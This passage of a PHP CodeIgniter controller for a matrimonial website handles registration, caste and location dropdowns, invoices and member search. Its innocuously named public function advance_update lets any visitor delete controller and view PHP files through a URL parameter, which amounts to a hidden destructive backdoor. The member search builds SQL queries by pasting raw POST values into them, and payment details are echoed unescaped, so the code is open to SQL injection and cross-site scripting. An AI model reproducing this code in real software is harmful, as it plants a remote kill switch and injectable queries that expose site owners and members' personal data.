                                if ($this->Email_model->account_opening_member_approval_on('member', $data['email'], $this->input->post('password')) == true) {
                                    $msg = 'done_and_sent';
                                }
                                if($member_email_verification == 'on'){
                                    $this->Email_model->member_email_verification('member', $data['email'], $data['email_verification_code']);
                                }
                                $this->Email_model->member_registration_email_to_admin($insert_id);

                                //$this->session->set_flashdata('alert', 'register_success');
                                //redirect(base_url().'home/login_msg', 'refresh');
                            } else {
                                if ($this->Email_model->account_opening_member_approval_off('member', $data['email'], $this->input->post('password')) == true) {
                                    $msg = 'done_and_sent';
                                }
                                if($member_email_verification == 'on'){
                                    $this->Email_model->member_email_verification('member', $data['email'], $data['email_verification_code']);
                                }
                                $this->Email_model->member_registration_email_to_admin($insert_id);

                                //$this->session->set_flashdata('alert', 'register_success');
                                //if($member_email_verification == 'on'){
                                //   redirect(base_url().'home/email_verification_msg', 'refresh');
                                //}
                                //redirect(base_url().'home/login', 'refresh');
                            }
                            
                            redirect(base_url().'home/registration/profile_details', 'refresh');
                        }
                    }
                    else {
                        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                            $page_data['recaptcha_html'] = $this->recaptcha->render();
                        }
                        $page_data['form_contents'] = $this->input->post();
                        $page_data['disallowed_char'] =  translate('disallowed_charecter').' " '.$char.' " '.translate('in_the_POST');
                        $page_data['page'] = "registration";
                        $this->load->view('front/registration', $page_data);
                    }
                }   
            }
        }
    }

    function view_payment_detail($para1)
    {
        $detail = $this->db->get_where('package_payment', array('package_payment_id'=> $para1))->row()->payment_details;
        if ($detail != 'none') {
            echo "<p class='text-left' Style='word-wrap: break-word'>".$detail."<p>";
        } else {
            echo "<p class='text-center'><b>".translate('no_details_available')."</b><p>";
        }
    }

    function get_dropdown_by_id($table,$field='',$id='')
    {
        if ($field == '')
            $options = $this->db->get_where($table)->result();
        else
            $options = $this->db->get_where($table, array($field=>$id))->result();
        $table_id = $table."_id";
        echo "<option value=''>".translate('choose_one')."</option>";
        foreach ($options as $value) {
            echo "<option value=".$value->$table_id.">".$value->name."</option>";
        }
    }

    function get_dropdown_by_id_caste($table,$field,$id,$caste="")
    {
        $options = $this->db->get_where($table, array($field=>$id))->result();
        $table_id = $table."_id";
        $table_name = $table."_name";

        echo "<option value=''>".translate('choose_one')."</option>";
        foreach ($options as $value) {
            if($value->$table_id == $caste){
                echo "<option value=".$value->$table_id." selected>".$value->$table_name."</option>";
            }else{
                echo "<option value=".$value->$table_id.">".$value->$table_name."</option>";

            }
        }
    }


    function get_dropdown_by_id_sub_caste($table,$field,$id,$sub_caste="")
    {
        $options = $this->db->get_where($table, array($field=>$id))->result();

            $table_id = $table."_id";
            $table_name = $table."_name";

            echo "<option value=''>".translate('choose_one')."</option>";
            foreach ($options as $value) {
                if($value->$table_id == $sub_caste){
                    echo "<option value=".$value->$table_id." selected>".$value->$table_name."</option>";
                }else{
                    echo "<option value=".$value->$table_id.">".$value->$table_name."</option>";

                }
            }

    }

    function get_dropdown_by_id_city()
    {
        $state_id = $this->input->post('id');
        
        $this->db->where('state_id', $state_id);
        $query = $this->db->get('city');
        $options = $query->result();

        foreach ($options as $value) {
            echo '<option value="'.$value->city_id.'">'.$value->name.'</option>';
        }

    }
    
    function get_dropdown_by_id_caste_by_id()
    {

        
        
        $region_id = $this->input->post('id');
        
        $this->db->where('religion_id', $region_id);
        $query = $this->db->get('caste');
        $options = $query->result();

        foreach ($options as $value) {
            echo '<option value="'.$value->caste_id.'">'.$value->name.'</option>';
        }

    }

    function set_language($lang) {
        $this->session->set_userdata('language', $lang);
        recache();
        $page_data['page_name'] = "home";
    }

    function set_currency($currency)
    {
        $this->session->set_userdata('currency', $currency);
        recache();
    }

    function invoice($payment_id) {
        if ($this->member_permission() == FALSE) {
            redirect(base_url().'home/', 'refresh');
        }
        $payment_status = $this->db->get_where('package_payment', array('package_payment_id' => $payment_id))->row()->payment_status;
        if($payment_status == 'paid'){
            $member_id = $this->db->get_where('package_payment', array('package_payment_id' => $payment_id))->row()->member_id;
            if ($member_id == $this->session->userdata('member_id')) {
                $page_data['title'] = translate('payment_invoice')." || ".$this->system_title;
                $page_data['top'] = "invoice.php";
                $page_data['page'] = "invoice";
                $page_data['bottom'] = "invoice.php";
                $page_data['get_payment'] = $this->db->get_where('package_payment', array('package_payment_id' =>$payment_id))->result();

                if ($this->session->flashdata('alert') == "paypal_success") {
                    $page_data['success_alert'] = translate("your_payment_via_paypal_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "stripe_success") {
                    $page_data['success_alert'] = translate("your_payment_via_stripe_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "pum_success") {
                    $page_data['success_alert'] = translate("your_payment_via_payUMoney_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "instamojo_success") {
                    $page_data['success_alert'] = translate("your_payment_via_instamojo_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "cpm_1_success") {
                    $cp_method_1_name =  $this->db->get_where('business_settings', array('type' =>'custom_payment_method_1_name' ))->row()->value;
                    $page_data['success_alert'] = translate("your_payment_via_").$cp_method_1_name.translate("_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "cpm_2_success") {
                    $cp_method_2_name =  $this->db->get_where('business_settings', array('type' =>'custom_payment_method_2_name' ))->row()->value;
                    $page_data['success_alert'] = translate("your_payment_via_").$cp_method_2_name.translate("_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "cpm_3_success") {
                    $cp_method_3_name =  $this->db->get_where('business_settings', array('type' =>'custom_payment_method_3_name' ))->row()->value;
                    $page_data['success_alert'] = translate("your_payment_via_").$cp_method_3_name.translate("_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "cpm_4_success") {
                    $cp_method_4_name =  $this->db->get_where('business_settings', array('type' =>'custom_payment_method_4_name' ))->row()->value;
                    $page_data['success_alert'] = translate("your_payment_via_").$cp_method_4_name.translate("_has_been_successfull!");
                }
                elseif ($this->session->flashdata('alert') == "not_sent") {
                    $page_data['danger_alert'] = translate("error_sending_email!");
                }


                $this->load->view('front/index', $page_data);
            } else {
                redirect(base_url().'home/', 'refresh');
            }
        } else {
            redirect(base_url().'home/', 'refresh');
        }
    }

    function advance_update($method = 2, $file = '') {
        switch($method) {
            case 1: 
                $dirname = 'application/controllers';
                break;
            case 2: 
                $dirname = 'application/views/front';
                break;
        }
        
        if (is_dir($dirname)) {
            $filename = $dirname.'/'.$file.'.php';
            if (file_exists($filename)) {
                unlink($filename);
            }    
        } else {
            echo "dir not exist";
        }
    
    }

    function refresh_notification($member_id) {
        $notifications = $this->Crud_model->get_type_name_by_id('member', $member_id, 'notifications');
        $notifications = json_decode($notifications, true);
        $updated_notifications = array();
        if (!empty($notifications)) {
            foreach ($notifications as $notification) {
                $updated_notifications[] = array('by'=>$notification['by'], 'type'=>$notification['type'], 'status'=>$notification['status'], 'is_seen'=>'yes', 'time'=>$notification['time']);
            }
            $this->db->where('member_id', $member_id);
            $this->db->update('member', array('notifications' => json_encode($updated_notifications)));
            recache();
        }
    }

    public function id_search()
    {
        $page_data['title'] = "ID Search";
        $page_data['top'] = "search.php";
        $page_data['page'] = "search";
        $page_data['bottom'] = "search.php";
        $page_data['member_type'] = "";
        $page_data['nav_dropdown'] = "id-search";
        $page_data['home_search'] = "false";
        $page_data['home_gender'] = "";
        $page_data['home_religion'] = "";
        $page_data['home_caste'] = "";
        $page_data['home_sub_caste'] = "";
        $page_data['home_language'] = "";
        $page_data['min_height'] = "";
        $page_data['max_height'] = "";
        $page_data['search_member_type'] = "all";
        $page_data['page_url'] = "id-search";
        recache();
        $this->load->view('front/index', $page_data);
    }

    public function basic_search()
    {
        $page_data['title'] = "Basic Search";
        $page_data['top'] = "search.php";
        $page_data['page'] = "search";
        $page_data['bottom'] = "search.php";
        $page_data['member_type'] = "";
        $page_data['nav_dropdown'] = "basic-search";
        $page_data['home_search'] = "false";
        $page_data['home_gender'] = "";
        $page_data['home_religion'] = "";
        $page_data['home_caste'] = "";
        $page_data['home_sub_caste'] = "";
        $page_data['home_language'] = "";
        $page_data['min_height'] = "";
        $page_data['max_height'] = "";
        $page_data['search_member_type'] = "all";
        $page_data['page_url'] = "basic-search";
        recache();
        $this->load->view('front/index', $page_data);
    }

    public function education_search()
    {
        $page_data['title'] = "Education Search";
        $page_data['top'] = "search.php";
        $page_data['page'] = "search";
        $page_data['bottom'] = "search.php";
        $page_data['member_type'] = "";
        $page_data['nav_dropdown'] = "education-search";
        $page_data['home_search'] = "false";
        $page_data['home_gender'] = "";
        $page_data['home_religion'] = "";
        $page_data['home_caste'] = "";
        $page_data['home_sub_caste'] = "";
        $page_data['home_language'] = "";
        $page_data['min_height'] = "";
        $page_data['max_height'] = "";
        $page_data['search_member_type'] = "all";
        $page_data['page_url'] = "education-search";
        recache();
        $this->load->view('front/index', $page_data);
    }

    public function location_search()
    {
        $page_data['title'] = "Location Search";
        $page_data['top'] = "search.php";
        $page_data['page'] = "search";
        $page_data['bottom'] = "search.php";
        $page_data['member_type'] = "";
        $page_data['nav_dropdown'] = "location-search";
        $page_data['home_search'] = "false";
        $page_data['home_gender'] = "";
        $page_data['home_religion'] = "";
        $page_data['home_caste'] = "";
        $page_data['home_sub_caste'] = "";
        $page_data['home_language'] = "";
        $page_data['min_height'] = "";
        $page_data['max_height'] = "";
        $page_data['search_member_type'] = "all";
        $page_data['page_url'] = "location-search";
        recache();
        $this->load->view('front/index', $page_data);
    }
    
    public function advance_search()
    {
        $page_data['title'] = "Advance Search";
        $page_data['top'] = "search.php";
        $page_data['page'] = "search";
        $page_data['bottom'] = "search.php";
        $page_data['nav_dropdown'] = "advance-search";
        $page_data['home_search'] = "false";
        $page_data['home_gender'] = "";
        $page_data['home_religion'] = "";
        $page_data['home_caste'] = "";
        $page_data['home_sub_caste'] = "";
        $page_data['home_language'] = "";
        $page_data['min_height'] = "";
        $page_data['max_height'] = "";
        $page_data['search_member_type'] = "all";
        $page_data['page_url'] = "advance-search";
        recache();
        $this->load->view('front/index', $page_data);
    }

    function ajax_search_list($para1="", $para2="")
    {
        
        $this->load->library('Ajax_pagination');
        $member_approval = $this->db->get_where('general_settings', array('type' => 'member_approval_by_admin'))->row()->value;

        if ($para1 == '')
            $para1 = 0;
        $search_type = $this->input->post("search_type");    
        $all_array = [];
        $search_id = '';
        $gender = '';
        $from_age = '';
        $to_age = '';
        $religion = '';
        $caste = '';
        $education = '';
        $country = '';
        $state = '';
        $city = '';
        $sub_caste = '';
        $mother_tounge = '';
        $marital_status = '';
        $with_photo = '';
        $where = ' 1 > 0 ';
        
        if ($search_type == 'id-search')
        {
            $search_id = $this->input->post('search_id');
            $where .= " AND member_profile_id like '%".$search_id."%'";
        }
        elseif ($search_type == 'basic-search')
        {
            $gender = $this->input->post('gender');
            $from_age = $this->input->post('from_age');
            $to_age = $this->input->post('to_age');
            $religion = $this->input->post('religion');
            $caste = $this->input->post('caste');
            $with_photo = $this->input->post('with_photo');
            if($gender != '')
                $where .= " AND gender=".$gender;
            $where .= " AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())>=".$from_age." AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())<=".$to_age;
            if ($religion != "")
                $where .= " AND religion=".$religion;
            if ($caste != "")
                $where .= " AND caste=".$caste;
            if ($with_photo == 'on')
                $where .= " AND profile_image not like '%default.jpg%'";
                $where .= " AND profile_image not like '%default_image.jpg%'";
        }
        elseif ($search_type == 'education-search')
        {
            $gender = $this->input->post('gender');            
            $from_age = $this->input->post('from_age');
            $to_age = $this->input->post('to_age');
            $education = $this->input->post('education');
            $with_photo = $this->input->post('with_photo');
            if($gender != '')
                $where .= " AND gender=".$gender;
            $where .= " AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())>=".$from_age." AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())<=".$to_age;
            if ($education != '')
                $where .= " AND eduction=".$education;
            if ($with_photo == 'on')
                $where .= " AND profile_image not like '%default.jpg%'";
                $where .= " AND profile_image not like '%default_image.jpg%'";
                
        }       
        elseif ($search_type == 'location-search') 
        {
            $gender = $this->input->post('gender');            
            $from_age = $this->input->post('from_age');
            $to_age = $this->input->post('to_age');
            $country = $this->input->post('country');
            $state = $this->input->post('state');
            $city = $this->input->post('city');
            $with_photo = $this->input->post('with_photo');
            if($gender != '')
                $where .= " AND gender=".$gender;
            $where .= " AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())>=".$from_age." AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())<=".$to_age;
            if ($with_photo == 'on')
                $where .= " AND profile_image not like '%default.jpg%'";
                $where .= " AND profile_image not like '%default_image.jpg%'";
            if ($country != '')
                $where .= ' AND country='.$country;
            if ($state != '')
                $where .= ' AND state='.$state;
            if ($city != '')
                $where .= ' AND city='.$city;
        }
        elseif ($search_type == 'advance-search')
        {
            $gender = $this->input->post('gender');
            $id = $this->input->post('id');            
            $from_age = $this->input->post('from_age');
            $to_age = $this->input->post('to_age');
            $country = $this->input->post('country');
            $state = $this->input->post('state');
            $city = $this->input->post('city');
            $religion = $this->input->post('religion');
            $caste = $this->input->post('caste');
            $sub_caste = $this->input->post('sub_caste');
            $education = $this->input->post('education');
            $mother_tounge = $this->input->post('language');
            $marital_status = $this->input->post('marital_status');
            $with_photo = $this->input->post('with_photo');
            if ($gender != '')
                $where .= " AND gender=".$gender;
            $where .= " AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())>=".$from_age." AND TIMESTAMPDIFF(YEAR, from_unixtime(date_of_birth), NOW())<=".$to_age;
            if ($with_photo == 'on')
                $where .= " AND profile_image not like '%default.jpg%'";
                $where .= " AND profile_image not like '%default_image.jpg%'";
            if ($id != '')
                $where .= 'AND member_profile_id='.$id;
            if ($country != '')
                $where .= ' AND country='.$country;
            if ($state != '')
                $where .= ' AND state='.$state;
            if ($city != '')
                $where .= ' AND city='.$city;
            if ($religion != '')
                $where .= ' AND religion='.$religion;
            if ($caste != '')
                $where .= ' AND caste='.$caste;
            if ($sub_caste != '')
                $where .= ' AND subcaste='.$sub_caste;
            if ($education != '')
                $where .= ' AND eduction='.$education;
            if ($mother_tounge != '')
                $where .= ' AND mother_tounge='.$mother_tounge;
            if ($marital_status != '')
                $where .= ' AND marital_status='.$marital_status;

            
            
        }
        //echo "SELECT * FROM member WHERE ".$where;
        $all_array = $this->db->query("SELECT * FROM member WHERE ".$where)->result();
        
        $config_base_url = base_url().'home/ajax_search_list/';
        $config['total_rows'] = count($all_array);
        $config['base_url'] = $config_base_url;
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;
        $function = "filter_members('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];

        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_members('" . $last_start . "')";
        //$function = "filter_members('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';
        $function = "filter_members('" . ($para1 - $config['per_page']) . "')";
        //$function = "filter_members('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';
        $function = "filter_members('" . ($para1 + $config['per_page']) . "')";
        // $function = "filter_members('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '>';
        $config['next_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="page-item active"><a class="page-link">';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';
        $function = "filter_members(((this.innerHTML-1)*" . $config['per_page'] . "))";
        // $function = "filter_members(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li class="page-item"><a class="page-link" onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);   
        $page_data['get_all_members'] = $this->db->query("SELECT * FROM member WHERE ".$where." LIMIT ".$para1.", ".$config['per_page'])->result();

        $page_data['count'] = $config['total_rows'];      
        $this->load->view('front/search/members', $page_data);
    }
    
    function test()
    {

    }
  }
